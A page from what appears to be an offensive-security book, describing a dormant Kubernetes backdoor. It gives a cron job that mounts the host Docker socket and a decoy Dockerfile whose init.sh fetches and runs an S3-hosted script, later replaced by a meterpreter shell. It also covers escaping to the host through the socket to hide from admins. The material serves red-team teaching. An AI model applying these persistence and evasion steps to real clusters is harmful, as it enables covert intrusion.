- pgno: 181
  md: "```\nspec:\n  template:\n    spec:\n      containers:\n        - name: metrics-collect\n\
    \          image: 882347352467.dkr.ecr.eu-west-1.amazonaws.com/amazon-metrics-collector\n\
    \          volumeMounts:\n            - mountPath: /var/run/docker.sock\n    \
    \          name: dockersock\n      volumes:\n        - name: dockersock\n    \
    \      hostPath:\n            path: /var/run/docker.sock\n      restartPolicy:\
    \ Never\n```\n\n# Listing 9-6: The cron job for our stealthy backdoor\n\nThis\
    \ cron job loads the amazon-metrics-collector image from yet another AWS account\
    \ we control. This Docker image has a thicker structure and may even pass for\
    \ a legit metrics job (see Listing 9-7).\n\n```\n# Dockerfile\n\nFROM debian:\
    \ buster-slim\n\nRUN apt update && apt install -y git make\nRUN apt install -y\
    \ prometheus-varnish-exporter\nCOPY init.sh /var/run/init.sh\n\nENTRYPOINT [\"\
    /var/run/init.sh\"]\n```\n\n# Listing 9-7: A Dockerfile installing a number of\
    \ packages and executing a script on startup\n\nBehind the façade of useless packages\
    \ and dozens of dummy lines of code, deep inside init.sh, we place an instruction\
    \ that downloads and executes our custom script hosted on S3. At first, this remote\
    \ script will be a harmless dummy echo command. The moment we want to activate\
    \ this backdoor to regain access to the system, we overwrite the file on S3 with\
    \ our custom meterpreter. It's a sort of dormant shell that we only use in case\
    \ of emergency.\n\nThis setup, however, will not completely solve the original\
    \ problem of visibility. Once we activate our shell, we will have a pod constantly\
    \ running on the system, visible to every Kube admin.\n\nOne optimization is to\
    \ avoid executing our custom stager directly on the foreign container metrics-collector\
    \ pod. Instead, we will use this pod to contact the Docker socket that we so conveniently\
    \ mounted and instruct it to start yet another container on the host, which will\
    \ in time load the meterpreter agent. The metrics-collector pod, having done its\
    \ job, can gracefully terminate, while our shell remains running unhindered in\
    \ its own second container."
